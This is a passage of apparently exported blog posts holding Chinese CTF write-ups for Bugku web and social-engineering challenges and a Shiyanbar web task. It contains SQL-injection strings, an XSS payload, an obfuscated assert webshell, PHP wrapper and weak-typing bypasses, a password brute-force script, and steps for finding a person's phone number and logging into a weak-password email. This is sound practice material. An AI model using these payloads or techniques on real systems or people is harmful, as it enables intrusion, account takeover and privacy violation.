class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by PhpStorm.</span></span><br><span class="line"><span class="comment"> * User: Norse</span></span><br><span class="line"><span class="comment"> * Date: 2017/8/6</span></span><br><span class="line"><span class="comment"> * Time: 20:22</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">"flag.php"</span>;</span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = strstr($_SERVER[<span class="string">'REQUEST_URI'</span>], <span class="string">'?'</span>); <span class="comment">#strstr获得URI从'?'往后(包括'?')的字符串，</span></span><br><span class="line">$str = substr($str,<span class="number">1</span>); <span class="comment">#去掉'?'</span></span><br><span class="line">$str = str_replace(<span class="string">'key'</span>,<span class="string">''</span>,$str); <span class="comment">#把字符串中的'key'替换为空</span></span><br><span class="line">parse_str($str);</span><br><span class="line"><span class="keyword">echo</span> md5($key1);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> md5($key2);</span><br><span class="line"><span class="keyword">if</span>(md5($key1) == md5($key2) &amp;&amp; $key1 !== $key2)&#123;  <span class="comment">#md5key1等于md5key2且key1不完全等于key2</span></span><br><span class="line">    <span class="keyword">echo</span> $flag.<span class="string">"取得flag"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>因为会把<code>key</code>替换掉，所以可以用<code>kekeyy</code>这样的形式绕过<br>if判断可以用php弱类型绕过<br>构造url得到flag：<code>http://120.24.86.145:8002/web16/index.php?kekeyy1=s878926199a&amp;kekeyy2=s214587387a</code><br><!--Bugku{OH_YOU_FIND_MY_MOMY}--></p><h1 id="成绩单"><a href="#成绩单" class="headerlink" title="成绩单"></a>成绩单</h1><figure class="highlight plain"><figcaption><span>判断注入点</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id=0</span><br><span class="line">id=0&apos; union select 1,2,3,4#</span><br></pre></td></tr></table></figure><figure class="highlight plain"><figcaption><span>查询</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">id=0&apos; union select 1,2,3,database()#</span><br><span class="line">id=0&apos; union select 1,2,3,table_name from information_schema.tables where table_schema=database()#</span><br><span class="line">id=0&apos; union select 1,2,3,column_name from information_schema.columns where table_name=&apos;fl4g&apos;#</span><br><span class="line">id=0&apos; union select 1,2,3,skctf_flag from fl4g#</span><br></pre></td></tr></table></figure><!--BUGKU{Sql_INJECT0N_4813drd8hz4}--><h1 id="秋名山老司机"><a href="#秋名山老司机" class="headerlink" title="秋名山老司机"></a>秋名山老司机</h1><figure class="highlight python"><figcaption><span>Payload</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests,re</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    url = <span class="string">'http://120.24.86.145:8002/qiumingshan/'</span></span><br><span class="line">    s = requests.session()</span><br><span class="line">    r = s.get(url)</span><br><span class="line">    <span class="comment"># r.encoding = 'utf-8'</span></span><br><span class="line">    a = re.findall(<span class="string">r'&lt;div&gt;(.*)=\?;&lt;/div&gt;'</span>,r.text)</span><br><span class="line">    <span class="comment"># print(r.text)</span></span><br><span class="line">    a = eval(a[<span class="number">0</span>]) <span class="comment">#将字符串公式转化为公式</span></span><br><span class="line">    r = s.post(url,data=&#123;<span class="string">'value'</span>:a&#125;)</span><br><span class="line">    r.encoding = <span class="string">'utf-8'</span></span><br><span class="line">    print(r.text)</span><br><span class="line"></span><br><span class="line">main()</span><br></pre></td></tr></table></figure><!--Bugku{YOU_DID_IT_BY_SECOND}--><h1 id="速度要快"><a href="#速度要快" class="headerlink" title="速度要快"></a>速度要快</h1><figure class="highlight python"><figcaption><span>Payload</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    url = <span class="string">'http://120.24.86.145:8002/web6/'</span></span><br><span class="line">    s = requests.session()</span><br><span class="line">    req = s.get(url)</span><br><span class="line">    <span class="comment"># print(req.text)</span></span><br><span class="line">    data = str(b64decode((req.headers)[<span class="string">'flag'</span>]),encoding=<span class="string">'utf-8'</span>)</span><br><span class="line">    <span class="comment"># print(data)</span></span><br><span class="line">    data = b64decode(data.split(<span class="string">':'</span>)[<span class="number">1</span>]) <span class="comment">#切片</span></span><br><span class="line">    <span class="comment"># print(data)</span></span><br><span class="line">    response = s.post(url,data=&#123;<span class="string">'margin'</span>:data&#125;)</span><br><span class="line">    print(response.text)</span><br><span class="line"></span><br><span class="line">main()</span><br></pre></td></tr></table></figure><!--KEY{111dd62fcd377076be18a}--><h1 id="cookies欺骗"><a href="#cookies欺骗" class="headerlink" title="cookies欺骗"></a>cookies欺骗</h1><p>url上有base64的参数，解码是key.txt，把参数换成index.php，发现line按行返回 ,一共18行全部抓下来<br><figure class="highlight php"><figcaption><span>源代码</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(<span class="number">0</span>); </span><br><span class="line">$file=base64_decode(<span class="keyword">isset</span>($_GET[<span class="string">'filename'</span>])?$_GET[<span class="string">'filename'</span>]:<span class="string">""</span>); </span><br><span class="line">$line=<span class="keyword">isset</span>($_GET[<span class="string">'line'</span>])?intval($_GET[<span class="string">'line'</span>]):<span class="number">0</span>; </span><br><span class="line"><span class="keyword">if</span>($file==<span class="string">''</span>) header(<span class="string">"location:index.php?line=&amp;filename=a2V5cy50eHQ="</span>); </span><br><span class="line">$file_list = <span class="keyword">array</span>( </span><br><span class="line"><span class="string">'0'</span> =&gt;<span class="string">'keys.txt'</span>, </span><br><span class="line"><span class="string">'1'</span> =&gt;<span class="string">'index.php'</span>, </span><br><span class="line">); </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_COOKIE[<span class="string">'margin'</span>]) &amp;&amp; $_COOKIE[<span class="string">'margin'</span>]==<span class="string">'margin'</span>)&#123; <span class="comment">#需要Cookie参数margin=margin</span></span><br><span class="line">$file_list[<span class="number">2</span>]=<span class="string">'keys.php'</span>;  <span class="comment">#访问keys.php</span></span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(in_array($file, $file_list))&#123; </span><br><span class="line">$fa = file($file); </span><br><span class="line"><span class="keyword">echo</span> $fa[$line]; </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>用bp开代理访问：<code>http://120.24.86.145:8002/web11/index.php?line=&amp;filename=a2V5cy5waHA=</code><br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Bugku/Web/2018-07-27-17-11-57.png" alt="修改数据包，加入Cookie参数" title="" class="">                <p>修改数据包，加入Cookie参数</p>            </figure><br>右键源代码得到flag<br><!--KEY{key_keys}--></p><h1 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h1><p>反射性注入，发现<code>&lt;</code>与<code>&gt;</code>被过滤,unicode编码绕过<br><figure class="highlight h"><figcaption><span>Payload</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//103.238.227.13:10089/index.php?id=\u003cscript\u003ealert(_key_)\u003c/script\u003e</span></span><br></pre></td></tr></table></figure></p><!--Flag:17f094325e90085b30a5ddefce34acd8--><h1 id="never-give-up"><a href="#never-give-up" class="headerlink" title="never give up"></a>never give up</h1><p>右键源代码<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--1p.html--&gt;</span></span><br></pre></td></tr></table></figure></p><p>访问：<code>view-source:http://120.24.86.145:8006/test/1p.html</code><br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">HTML</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">HEAD</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">SCRIPT</span> <span class="attr">LANGUAGE</span>=<span class="string">"Javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">&lt;!--</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> Words =<span class="string">"%3Cscript%3Ewindow.location.href%3D%27http%3A//www.bugku.com%27%3B%3C/script%3E%20%0A%3C%21--JTIyJTNCaWYlMjglMjElMjRfR0VUJTVCJTI3aWQlMjclNUQlMjklMEElN0IlMEElMDloZWFkZXIlMjglMjdMb2NhdGlvbiUzQSUyMGhlbGxvLnBocCUzRmlkJTNEMSUyNyUyOSUzQiUwQSUwOWV4aXQlMjglMjklM0IlMEElN0QlMEElMjRpZCUzRCUyNF9HRVQlNUIlMjdpZCUyNyU1RCUzQiUwQSUyNGElM0QlMjRfR0VUJTVCJTI3YSUyNyU1RCUzQiUwQSUyNGIlM0QlMjRfR0VUJTVCJTI3YiUyNyU1RCUzQiUwQWlmJTI4c3RyaXBvcyUyOCUyNGElMkMlMjcuJTI3JTI5JTI5JTBBJTdCJTBBJTA5ZWNobyUyMCUyN25vJTIwbm8lMjBubyUyMG5vJTIwbm8lMjBubyUyMG5vJTI3JTNCJTBBJTA5cmV0dXJuJTIwJTNCJTBBJTdEJTBBJTI0ZGF0YSUyMCUzRCUyMEBmaWxlX2dldF9jb250ZW50cyUyOCUyNGElMkMlMjdyJTI3JTI5JTNCJTBBaWYlMjglMjRkYXRhJTNEJTNEJTIyYnVna3UlMjBpcyUyMGElMjBuaWNlJTIwcGxhdGVmb3JtJTIxJTIyJTIwYW5kJTIwJTI0aWQlM0QlM0QwJTIwYW5kJTIwc3RybGVuJTI4JTI0YiUyOSUzRTUlMjBhbmQlMjBlcmVnaSUyOCUyMjExMSUyMi5zdWJzdHIlMjglMjRiJTJDMCUyQzElMjklMkMlMjIxMTE0JTIyJTI5JTIwYW5kJTIwc3Vic3RyJTI4JTI0YiUyQzAlMkMxJTI5JTIxJTNENCUyOSUwQSU3QiUwQSUwOXJlcXVpcmUlMjglMjJmNGwyYTNnLnR4dCUyMiUyOSUzQiUwQSU3RCUwQWVsc2UlMEElN0IlMEElMDlwcmludCUyMCUyMm5ldmVyJTIwbmV2ZXIlMjBuZXZlciUyMGdpdmUlMjB1cCUyMCUyMSUyMSUyMSUyMiUzQiUwQSU3RCUwQSUwQSUwQSUzRiUzRQ%3D%3D--%3E"</span> </span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">OutWord</span>(<span class="params"></span>)</span></span></span><br><span class="line"><span class="undefined">&#123;</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> NewWords;</span></span><br><span class="line"><span class="javascript">NewWords = <span class="built_in">unescape</span>(Words);</span></span><br><span class="line"><span class="javascript"><span class="built_in">document</span>.write(NewWords);</span></span><br><span class="line"><span class="undefined">&#125; </span></span><br><span class="line"><span class="undefined">OutWord();</span></span><br><span class="line"><span class="javascript"><span class="comment">// --&gt;</span></span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">HEAD</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">BODY</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">BODY</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">HTML</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>解码顺序：url解码→base64解码→url解码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!$_GET[<span class="string">'id'</span>])</span><br><span class="line">&#123;</span><br><span class="line">header(<span class="string">'Location: hello.php?id=1'</span>);</span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line">$id=$_GET[<span class="string">'id'</span>];</span><br><span class="line">$a=$_GET[<span class="string">'a'</span>];</span><br><span class="line">$b=$_GET[<span class="string">'b'</span>];</span><br><span class="line"><span class="keyword">if</span>(stripos($a,<span class="string">'.'</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'no no no no no no no'</span>;</span><br><span class="line"><span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br><span class="line">$data = @file_get_contents($a,<span class="string">'r'</span>);</span><br><span class="line"><span class="keyword">if</span>($data==<span class="string">"bugku is a nice plateform!"</span> <span class="keyword">and</span> $id==<span class="number">0</span> <span class="keyword">and</span> strlen($b)&gt;<span class="number">5</span> <span class="keyword">and</span> eregi(<span class="string">"111"</span>.substr($b,<span class="number">0</span>,<span class="number">1</span>),<span class="string">"1114"</span>) <span class="keyword">and</span> substr($b,<span class="number">0</span>,<span class="number">1</span>)!=<span class="number">4</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">require</span>(<span class="string">"f4l2a3g.txt"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">print</span> <span class="string">"never never never give up !!!"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><figcaption><span>payload</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">url:http://120.24.86.145:8006/test/hello.php?id=asd&amp;b=%0012345&amp;a=php://input</span><br><span class="line">post:bugku is a nice plateform!</span><br></pre></td></tr></table></figure><p>参考：<a href="https://ciphersaw.me/2017/12/26/%E3%80%90Bugku%20CTF%E3%80%91%20Web%20%E2%80%94%E2%80%94%20never%20give%20up/" target="_blank" rel="noopener">never give up</a></p><h2 id="非预期解"><a href="#非预期解" class="headerlink" title="非预期解"></a>非预期解</h2><p>访问<code>http://120.24.86.145:8006/test/f4l2a3g.txt</code>得到flag<br><!--flag{tHis_iS_THe_fLaG}--></p><h1 id="welcome-to-bugkuctf"><a href="#welcome-to-bugkuctf" class="headerlink" title="welcome to bugkuctf"></a>welcome to bugkuctf</h1><p>参考：<a href="https://blog.csdn.net/csu_vc/article/details/78375203" target="_blank" rel="noopener">Bugku——welcome to bugkuctf（一道练习php://filter和php://input的好题）</a><br><!--flag{php_is_the_best_language}--></p><h1 id="过狗一句话"><a href="#过狗一句话" class="headerlink" title="过狗一句话"></a>过狗一句话</h1><figure class="highlight php"><figcaption><span>源码</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    $poc=<span class="string">"a#s#s#e#r#t"</span>; </span><br><span class="line">    $poc_1=explode(<span class="string">"#"</span>,$poc); </span><br><span class="line">    $poc_2=$poc_1[<span class="number">0</span>].$poc_1[<span class="number">1</span>].$poc_1[<span class="number">2</span>].$poc_1[<span class="number">3</span>].$poc_1[<span class="number">4</span>].$poc_1[<span class="number">5</span>]; </span><br><span class="line">    $poc_2($_GET[<span class="string">'s'</span>]) </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>assert执行任意代码<br><figure class="highlight"><figcaption><span>payload</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://123.206.87.240:8010/?s=var_dump(scandir('./'))</span><br></pre></td></tr></table></figure></p><figure class="highlight html"><figcaption><span>访问flag文件即可</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">array(6) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(1) "."</span><br><span class="line">  [1]=&gt;</span><br><span class="line">  string(2) ".."</span><br><span class="line">  [2]=&gt;</span><br><span class="line">  string(8) "f14g.txt"</span><br><span class="line">  [3]=&gt;</span><br><span class="line">  string(9) "index.php"</span><br><span class="line">  [4]=&gt;</span><br><span class="line">  string(4) "xxxx"</span><br><span class="line">  [5]=&gt;</span><br><span class="line">  string(19) "保护ctf人人有责.txt"</span><br><span class="line">&#125;</span><br><span class="line">can you get  flag?</span><br></pre></td></tr></table></figure><!--BUGKU{bugku_web_009801_a}--><h1 id="字符？正则？"><a href="#字符？正则？" class="headerlink" title="字符？正则？"></a>字符？正则？</h1><figure class="highlight"><figcaption><span>payload</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://123.206.87.240:8002/web10/?id=key1key1234key:/1/1keya.</span><br></pre></td></tr></table></figure><!-- KEY{0x0SIOPh550afc} --><p><br><br><br></p>]]></content>
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> Bugku </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Bugku-社工题-writeup</title>
      <link href="/2018/05/29/Bugku-%E7%A4%BE%E5%B7%A5%E9%A2%98-writeup/"/>
      <url>/2018/05/29/Bugku-%E7%A4%BE%E5%B7%A5%E9%A2%98-writeup/</url>
      <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><blockquote><p>Bugku社工题writeup</p></blockquote><a id="more"></a><h1 id="密码"><a href="#密码" class="headerlink" title="密码"></a>密码</h1><p>名字首字母小写+生日就是密码，格式KEY{}就是flag<br><!--KEY{zs19970315}--></p><h1 id="信息查找"><a href="#信息查找" class="headerlink" title="信息查找"></a>信息查找</h1><p>Google搜索：<code>bugku.cn 今日头条</code><br><!--KEY{462713425}--></p><h1 id="简单个人信息收集"><a href="#简单个人信息收集" class="headerlink" title="简单个人信息收集"></a>简单个人信息收集</h1><p>下载是个伪加密的zip<br>在哈尔滨市阿城区胜利街六委十三组    有个叫杜甫的你能把他的手机号找到吗？<br>flag格式  flag{手机号}<br>社工得到flag<br><!--flag{15206164164}--></p><h1 id="社工进阶"><a href="#社工进阶" class="headerlink" title="社工进阶"></a>社工进阶</h1><p>搜索<code>孤长离</code>发现一个贴吧，可以看到有个邮箱地址<br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Bugku/shegong/04-01.png" alt="" title="" class="">                <p></p>            </figure><br>根据提示弱口令，登陆邮箱找到flag（密码：a123456）<br><!--KEY{sg1H78Si9C0s99Q}--></p><h1 id="简单社工尝试"><a href="#简单社工尝试" class="headerlink" title="简单社工尝试"></a>简单社工尝试</h1><p>Google识图一下<br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Bugku/shegong/05-01.png" alt="" title="" class="">                <p></p>            </figure><br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Bugku/shegong/05-02.png" alt="" title="" class="">                <p></p>            </figure><br>点进来然后看到有个微博<br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Bugku/shegong/05-03.png" alt="" title="" class="">                <p></p>            </figure><br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Bugku/shegong/05-04.png" alt="" title="" class="">                <p></p>            </figure><br>访问图片中的url得到flag<br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Bugku/shegong/05-05.png" alt="" title="" class="">                <p></p>            </figure><br><!--flag{BUku_open_shgcx1}--></p><h1 id="王晓明的日记"><a href="#王晓明的日记" class="headerlink" title="王晓明的日记"></a>王晓明的日记</h1><p>注意提示：<a href="http://tool.bugku.com/" target="_blank" rel="noopener">多用bugku在线工具</a><br>应该是这玩儿意↓<br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Bugku/shegong/2018-07-25-10-45-46.png" alt="" title="" class="">                <p></p>            </figure><br>用提供的信息生成字典<br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Bugku/shegong/2018-07-25-10-49-12.png" alt="输入信息" title="" class="">                <p>输入信息</p>            </figure><br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Bugku/shegong/2018-07-25-10-49-44.png" alt="生成字典" title="" class="">                <p>生成字典</p>            </figure><br>python爆破脚本如下↓<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests,re</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">req</span><span class="params">(pwd)</span>:</span></span><br><span class="line">    url=<span class="string">'http://120.24.86.145:8002/xiaoming/?yes'</span></span><br><span class="line">    s = requests.session()</span><br><span class="line">    r = s.get(url)</span><br><span class="line">    r.encoding = <span class="string">'utf-8'</span></span><br><span class="line">    <span class="comment"># print(r.text)</span></span><br><span class="line">    response = s.post(url,data=&#123;<span class="string">'pwd'</span>:pwd&#125;)</span><br><span class="line">    response.encoding = <span class="string">'utf-8'</span></span><br><span class="line">    <span class="comment"># print(response.text)</span></span><br><span class="line">    b = re.findall(<span class="string">r'密码不正确，请重新输入'</span>, response.text)</span><br><span class="line">    <span class="comment"># print(b)</span></span><br><span class="line">    <span class="keyword">return</span> b</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">zidian</span><span class="params">()</span>:</span></span><br><span class="line">    f = open(<span class="string">'mima.txt'</span>,<span class="string">'r'</span>,encoding=<span class="string">'UTF-8'</span>)</span><br><span class="line">    a = f.read()</span><br><span class="line">    a = a.splitlines()</span><br><span class="line">    <span class="keyword">return</span> a</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">a = zidian()</span><br><span class="line"><span class="keyword">for</span> pwd <span class="keyword">in</span> a:</span><br><span class="line">    b = req(pwd)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> b[<span class="number">0</span>] == <span class="string">'密码不正确，请重新输入'</span>:</span><br><span class="line">            <span class="comment"># print(b[0])</span></span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        print(pwd)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure></p><!--flag{bugku-shegong_xmq}--><p><br><br><br></p>]]></content>
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Bugku </tag>
            
            <tag> 社工 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>实验吧-Web-writeup</title>
      <link href="/2018/05/29/%E5%AE%9E%E9%AA%8C%E5%90%A7-Web-writeup/"/>
      <url>/2018/05/29/%E5%AE%9E%E9%AA%8C%E5%90%A7-Web-writeup/</url>
      <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><blockquote><p>实验吧Web题writeup</p></blockquote><a id="more"></a><h1 id="天下武功唯快不破"><a href="#天下武功唯快不破" class="headerlink" title="天下武功唯快不破"></a>天下武功唯快不破</h1><p>看看响应头,requests and urllib两种写法<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests,base64</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    url = <span class="string">'http://ctf5.shiyanbar.com/web/10/10.php'</span></span><br><span class="line">    s = requests.session()</span><br><span class="line">    req = s.get(url)</span><br><span class="line">    key = base64.b64decode(req.headers[<span class="string">'flag'</span>]).decode(<span class="string">'utf-8'</span>)[<span class="number">25</span>:]</span><br><span class="line">    <span class="comment"># print(key)</span></span><br><span class="line">    response = s.post(url,data=&#123;<span class="string">'key'</span>:key&#125;)</span><br><span class="line">    print(response.text)</span><br><span class="line"></span><br><span class="line">main()</span><br></pre></td></tr></table></figure></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> request,parse</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    url = <span class="string">'http://ctf5.shiyanbar.com/web/10/10.php'</span></span><br><span class="line">    req = request.Request(url)</span><br><span class="line">    req.add_header(<span class="string">"Cookie"</span>, <span class="string">"PHPSESSID=ga0un6plm7tea9li11bgnommh1"</span>)</span><br><span class="line">    response = request.urlopen(req)</span><br><span class="line">    head = response.getheaders()[<span class="number">3</span>][<span class="number">1</span>]</span><br><span class="line">    post = base64.b64decode(head).decode(<span class="string">'utf-8'</span>)[<span class="number">25</span>:]</span><br><span class="line">    data = parse.urlencode([(<span class="string">'key'</span>,post)])</span><br><span class="line">    response = request.urlopen(req,data.encode(<span class="string">'utf-8'</span>))</span><br><span class="line">    print(response.read().decode(<span 